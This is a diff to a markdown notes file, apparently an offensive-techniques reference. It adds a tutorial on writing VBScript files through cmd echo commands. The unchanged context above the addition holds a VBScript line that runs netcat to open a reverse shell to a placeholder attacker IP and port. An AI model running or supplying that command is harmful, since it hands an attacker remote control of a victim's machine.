@@ -72,3 +72,55 @@ link.Save
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "cmd.exe /k nc -e cmd.exe ATTACKER_IP ATTACKER_PORT"
 ```
+
+
+You can create a `.vbs` (VBScript) file via the `echo` command using both single-line and multi-line approaches. Here's how:
+
+---
+### ***Create VBS or other file and write file via Shell***
+
+
+
+### **Method 1: Single-Line Approach**
+This is useful for small scripts that can fit in a single command.
+
+#### Example: Create a `hello.vbs` Script
+```cmd
+echo MsgBox "Hello from VBScript!" > hello.vbs
+```
+
+- **Explanation**:
+  - `echo` writes the text to a new file named `hello.vbs`.
+  - The content of the file is `MsgBox "Hello from VBScript!"`.
+  - To execute: 
+    ```cmd
+    cscript hello.vbs
+    ```
+    or just double-click `hello.vbs`.
+
+---
+
+### **Method 2: Multi-Line Approach**
+For larger scripts, you need to use a `>>` operator to append multiple lines to the file.
+
+#### Example: Create a More Complex VBScript
+```cmd
+echo Set objShell = CreateObject("WScript.Shell") > script.vbs
+echo objShell.Run "notepad.exe" >> script.vbs
+echo MsgBox "Notepad launched!", vbInformation, "VBScript Example" >> script.vbs
+```
+
+- **Explanation**:
+  - The `>` operator creates the file and writes the first line.
+  - The `>>` operator appends subsequent lines to the file.
+  - This script:
+    1. Creates a shell object.
+    2. Launches `notepad.exe`.
+    3. Displays a message box saying "Notepad launched!".
+
+#### Execution:
+To run the `script.vbs`:
+```cmd
+cscript script.vbs
+```
+or double-click `script.vbs`.
